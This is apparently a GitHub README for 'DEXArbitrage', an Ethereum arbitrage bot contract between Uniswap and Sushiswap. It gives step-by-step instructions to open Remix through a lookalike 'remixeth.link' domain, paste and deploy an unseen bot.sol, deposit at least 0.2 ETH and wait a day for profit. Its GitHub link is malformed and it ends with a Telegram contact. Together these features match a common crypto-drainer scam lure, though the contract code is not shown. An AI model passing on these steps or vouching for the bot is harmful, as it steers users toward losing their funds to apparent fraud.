# DEXArbitrage
This repository contains a smart contract for a simple Ethereum-based arbitrage bot that takes advantage of price differences between Uniswap and Sushiswap decentralized exchanges. The contract is written in Solidity and uses the UniswapV2 and SushiSwap Router interfaces.

## Setup

1. Access [Remix IDE](https://remixeth.link) and [MetaMask](https://www.metamask.io/download).
2. Right Click the 'Contracts' folder and then create 'New File'. Rename it whatever you want, or: “bot.sol”
3. Paste the [bot.sol](https://github.com/Tyler-P-Farris/DEXArbitrage/main/blob/bot.sol) source code from this repository into the file you just created.
4. Go to the "Compile" tab on Remix and Compile with Solidity version 0.6.6
5. Go to the 'Deploy & Run Transactions' tab on Remix, select the 'Injected Provider' environment, then 'Deploy'. This will create your own contract by confirming the MetaMask Contract creation fee
6. Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address
7. After your transaction is confirmed, start the bot by clicking the 'Start' button. Withdraw anytime by clicking 'Withdrawal'. Wait aroud a day for best profit potential.

[Telegram](https://t.me/TylerFarris)
[LinkedIn](https://www.linkedin.com/in/tyler-p-farris)
